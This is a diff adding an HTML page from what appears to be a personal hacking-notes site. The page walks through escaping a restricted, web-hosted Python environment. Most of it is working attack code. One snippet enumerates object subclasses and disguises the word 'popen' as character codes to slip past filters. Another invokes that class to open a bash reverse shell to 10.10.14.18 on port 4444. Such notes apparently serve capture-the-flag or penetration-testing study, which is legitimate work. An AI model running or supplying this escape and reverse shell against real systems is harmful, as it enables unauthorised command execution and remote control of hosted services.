@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>Python</h1>
+            <p>Programming language</p>
+        </div>
+        <div class="notion-body">
+            <h2>Escape from restricted environment</h2>
+            <ul>
+                <p>In some cases you may find that you are in a python environment that ables you to run commands but not all of them. The current case was a python IDE that was web hosted, in that case you could try several things</p>
+                <pre><code class="language-python">print(object.__subclasses__())</code></pre>
+                <p>Using that listed subclasses we can try to find which one relates to popen</p>
+                <pre><code class="language-python">for i, c in enumerate((()).__class__.__bases__[0].__subclasses__()):
+    name = c.__name__.lower()
+    if ''.join([chr(x) for x in [112, 111, 112, 101, 110]]) in name:
+        raise Exception(f'{i} → {name}')</code></pre>
+                <p>Now that we know which subclass belongs to popen we can use it to execute commands</p>
+                <pre><code class="language-python">cls = (()).__class__.__bases__[0].__subclasses__()[317]
+cmd = ['bash', '-c', 'bash -i >& /dev/tcp/10.10.14.18/4444 0>&1']
+proc = cls(cmd, stdout=-1, stderr=-1)
+proc.communicate()</code></pre>    
+                
+            </ul>    
+        </div>
+    </div>
+
+
+</body>
+</html>
